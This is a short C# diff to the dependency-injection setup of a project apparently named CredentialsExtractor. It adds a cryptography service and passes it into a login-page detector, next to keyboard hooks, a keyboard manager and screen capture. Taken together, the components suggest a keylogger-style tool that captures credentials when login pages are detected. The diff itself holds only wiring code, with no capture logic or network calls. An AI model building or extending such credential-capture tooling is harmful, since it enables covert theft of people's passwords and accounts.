@@ -2,6 +2,7 @@
 using CredentialsExtractor.Core;
 using CredentialsExtractor.Input;
 using CredentialsExtractor.Logging;
+using CredentialsExtractor.Cryptography;
 
 namespace CredentialsExtractor.DependencyInjection
 {
@@ -14,6 +15,9 @@ namespace CredentialsExtractor.DependencyInjection
             // Register core services
             RegisterService<ILogger>(logger);
             RegisterService<IAppConfig>(config);
+
+            // Register cryptography service
+            RegisterService<ICryptographyService>(CryptographyServiceFactory.CreateDefault());
 
             // Register input services
             RegisterService<IKeyboardHookFactory>(new KeyboardHookFactory());
@@ -29,12 +33,13 @@ namespace CredentialsExtractor.DependencyInjection
             // Register capture and detection services
             RegisterService<IScreenCapture>(new ScreenCapture(config, GetService<ILogger>()));
 
-            // Use DllLoginDetector with keyboard manager and application identifier
+            // Use DllLoginDetector with keyboard manager, application identifier, and cryptography service
             RegisterService<ILoginPageDetector>(new DllLoginDetector(
                 config,
                 GetService<ILogger>(),
                 GetService<IKeyboardManager>(),
                 GetService<IApplicationIdentifier>(),
+                GetService<ICryptographyService>(), // Add cryptography service
                 0.6));
 
             // Register monitor
